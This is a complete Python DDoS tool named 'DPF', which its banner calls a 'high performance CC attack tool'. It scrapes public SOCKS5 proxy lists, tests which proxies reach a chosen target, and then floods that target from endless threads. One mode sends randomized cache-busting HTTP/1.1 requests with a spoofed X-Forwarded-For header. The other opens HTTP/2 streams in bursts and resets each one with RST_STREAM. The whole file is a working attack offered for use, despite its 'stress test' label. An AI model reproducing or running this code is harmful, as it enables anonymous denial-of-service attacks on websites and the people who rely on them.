import ssl
import sys
import time
import socks
import socket
import random
import requests
import threading
from h2.connection import H2Connection
from h2.config import H2Configuration

rand = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
rInt = random.randint
rC = random.choice
th_list = []
thread_pool = []
download_proxy = []
worked_proxy = []
conns = 0


def checkProxies(): 
    # The logic for this function was provided by Leeon123, 
    # who is a well-known developer of the CC attack, and I made some modifications.
    # Using threading's senaphore to limit the maximum number of thread,
    # and remove the original setting (time.sleep) to improve detection efficiency.
    print("[DPF]-> Checking connection, please wait")
    time.sleep(1)
    for lines in download_proxy:
        lines = lines.strip()
        t = threading.Thread(target=checkingBySocks, args=(lines, ))
        t.start()
        time.sleep(0.01)
        thread_pool.append(t)
        sys.stdout.flush()
    for th in thread_pool:
        th.join()
        sys.stdout.flush()


def checkingBySocks(proxy):
    global conns
    try:
        proxy_ip, proxy_port = proxy.split(":") # Try split proxy_ip&port
        proxy_port = int(proxy_port) # change proxy_port to int
    except ValueError: 
        return # if some lines got Error Just return
    with threading.Semaphore(800):
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.set_proxy(p_Type, proxy_ip, proxy_port)
            s.settimeout(5)
            s.connect((host, port))
            if port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=host)
            try:
                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: Close\r\n\r\n".encode()) # and send HTTP Request
                s.close()
                worked_proxy.append(proxy)
                conns += 1
                print(f"[DPF]->proxy: \033[35m{proxy_ip:^15s}\033[0m port: \033[33;1m{str(proxy_port):^5s}\033[0m conns: \033[34m{str(conns):^4s}\033[0m >{proto:^5s} \033[32;1mConnected\033[0m")
                print(f'\33]0;[{conns}] Proxies Connected | ProxyChecker Code By GogoZin\a',end='')
                return
            except:
                print(f"[DPF]->proxy: \033[35m{proxy_ip:^15s}\033[0m port: \033[33;1m{str(proxy_port):^5s}\033[0m >{proto:^5s} \033[31;1m request failed\033[0m")
                s.close()
                return
        except:
            return


def s5Scraper():
    global download_proxy
    print("Auto Proxy Scraper Code By GogoZin")
    time.sleep(2)
    s5URL = ["https://www.proxy-list.download/api/v1/get?type=socks5",
             "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all",
             "https://api.proxyscrape.com/v2/?request=displayproxies",
             "https://www.proxy-list.download/api/v1/get?type=socks4",
             ]
    
    print("Start Fetch Socks5 Proxies")
    for u in s5URL:
        r = requests.get(u)
        if r.status_code == 200:
            print(f"[DPF]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
            lst = r.text.split("\r\n")
            for lines in lst:
                if len(lines) > 10 and len(lines) < 22:
                    download_proxy.append(lines)
    
    print("Start fetch from geonode ")
    geo = ["https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
           "https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500&page=2&sort_by=lastChecked&sort_type=desc",
           "https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500&page=3&sort_by=lastChecked&sort_type=desc"]
    for u in geo:
        r = requests.get(u)
        if r.status_code == 200:
            lst = r.text.split("}")
            # print(lst)
            for lines in lst:
                # print(lines)
                if "ip" and "port" in lines:
                    ip = lines.split("ip\":\"")[1].split("\",\"")[0]
                    port = lines.split("port\":\"")[1].split("\",\"")[0]
                    proxy = ip+":"+port
                download_proxy.append(proxy)
            
        print(f"[DPF]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
    
    # git_proxy_list = [                 #Github proxies is suck, so don't use it
    #         "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    #         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    #         "https://raw.githubusercontent.com/mmpx12/proxy-list/refs/heads/master/socks5.txt",
    #         "https://raw.githubusercontent.com/zevtyardt/proxy-list/refs/heads/main/socks5.txt",
    #         "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
    #         "https://raw.githubusercontent.com/sunny9577/proxy-scraper/refs/heads/master/generated/socks5_proxies.txt",
    #         "https://raw.githubusercontent.com/roosterkid/openproxylist/refs/heads/main/SOCKS5_RAW.txt",
    # ]

    # print("Start Get Github Proxies")
    # for u in git_proxy_list:
    #     host = u.split(".com/")[1]
    #     r = requests.get(u)
    #     if r.status_code == 200:
    #         print(f"[DPF]->status: \033[32;1m{r.status_code}\033[0m \033[36m{host}\033[0m")
    #         lst = r.text.split("\n")
    #         for lines in lst:
    #             if len(lines) > 10 and len(lines) < 22:
    #                 download_proxy.append(lines)
    
    download_proxy = sorted(set(download_proxy))


def banner():
    print(f"""

            ╔╦╗┬┌─┐┌┬┐┬─┐┬┌┐ ┬ ┬┌┬┐┌─┐┌┬┐                     
             ║║│└─┐ │ ├┬┘│├┴┐│ │ │ ├┤  ││                     
            ═╩╝┴└─┘ ┴ ┴└─┴└─┘└─┘ ┴ └─┘─┴┘                     
          ╔═╗┬─┐┌─┐─┐ ┬┬ ┬  ╔═╗┬  ┌─┐┌─┐┌┬┐
          ╠═╝├┬┘│ │┌┴┬┘└┬┘  ╠╣ │  │ ││ │ ││
          ╩  ┴└─└─┘┴ └─ ┴   ╚  ┴─┘└─┘└─┘─┴┘
DPF is a high performance CC attack tool, Code By GogoZin
          You can use it on web stress test 
       If you like this script, give me a star  :)
""")


def joinThreads():
    time.sleep(1)
    while 1:
        if len(th_list) > 0:
            for th in th_list:
                try:
                    th.join()
                except AttributeError:
                    pass
        time.sleep(5)


def launchThreads():
    threading.Thread(target=joinThreads).start()
    while 1:
        try:
            if version == "http":
                t = threading.Thread(target=send_requests, daemon=True)
            else:
                t = threading.Thread(target=send_rst, daemon=True)
            t.start()
            th_list.append(t)
        except:
            time.sleep(1)


def send_rst(): #Send http2 requests with rst_stream
    try:
        proxy_ip, proxy_port = random.choice(worked_proxy).split(":")
        proxy_port = int(proxy_port)
    except ValueError:
        return
    with threading.Semaphore(thr):
        while 1:
            try:
                s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                s.connect((host, port))
                if port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=host)
                try:
                    config = H2Configuration(client_side=True)
                    conn = H2Connection(config=config)
                    conn.initiate_connection()
                    s.sendall(conn.data_to_send())
                    try:
                        sid_lst = []
                        for _ in range(100):
                            p = path + "?" + rC(rand) + "=" + str(rInt(1,65535))
                            sid = 1 + 2 * _
                            sid_lst.append(sid)
                            conn.send_headers(sid, [(":method", "GET"),
                                                    (":authority", host),
                                                    (":path", p),
                                                    (":scheme", proto),
                                                    ("Cache-Control","no-Cahe, max-age=0")
                                                    ],
                                                    end_stream=True)
                            s.send(conn.data_to_send())
                        for sid in sid_lst:
                            conn.reset_stream(sid)
                            s.send(conn.data_to_send())
                            print(f"[DPFh2]->Proxy {str(proxy_ip):^15s} RST_STREAM #{str(sid):^5s} > {host}")
                        s.close()
                    except:
                        s.close()
                        break
                except:
                    s.close()
                    break
            except:
                break
        return


def send_requests(): #Send default http requests >HTTP/1.1
    try:
        proxy_ip, proxy_port = random.choice(worked_proxy).split(":")
        proxy_port = int(proxy_port)
    except ValueError:
        return
    with threading.Semaphore(thr):
        while 1:
            try:
                s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.set_proxy(p_Type, proxy_ip, proxy_port)
                s.connect((host, port))
                if port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=host)
                try:
                    for _ in range(100):
                        s.send(f"{method} {path}?{rC(rand)}{rC(rand)}={rInt(1,123456789)} HTTP/1.1\r\nHost: {host}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n".encode('utf-8'))
                        s.send(f"{method} {path}?{rC(rand)}{rC(rand)}={rInt(1,123456789)} HTTP/1.1\r\nHost: {host}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n".encode('utf-8'))
                    print(f"[DPF]->stress \033[36m{host}\033[0m from: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
                    s.close()
                except:
                    print(f"[DPF]->proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
                    s.close()
                    break
            except:
                break
        return


if __name__ == '__main__':
    if len(sys.argv) < 7:
        banner()
        print("Usage : DPF.py <GET/POST/HEAD> <host> <port> <threads> <path> <http/http2>")
        print(" --fetch  | For fetch proxies auto")
        sys.exit()
    else:
        banner()
        try:
            p_Type = socks.SOCKS5
            processes = []
            method = str(sys.argv[1])
            host = str(sys.argv[2])
            port = int(sys.argv[3])
            if port == 443:
                proto = "HTTPS"
            else:
                proto = "HTTP"
            thr = int(sys.argv[4])
            if thr > 800:
                thr = 800
            else:
                thr = thr
            path = str(sys.argv[5])
            version = str(sys.argv[6])
        except Exception as e:
            print(f"Argv Error : {e}")
            sys.exit()
        if "--fetch" in sys.argv:
            s5Scraper()
        else:
            download_proxy = open(str(input("Enter Your Proxy List File Name : "))).readlines()
        checkProxies()
        f = open("dpf.txt","w")
        for l in worked_proxy:
            f.write(l+"\n")
        f.close()
        launchThreads()
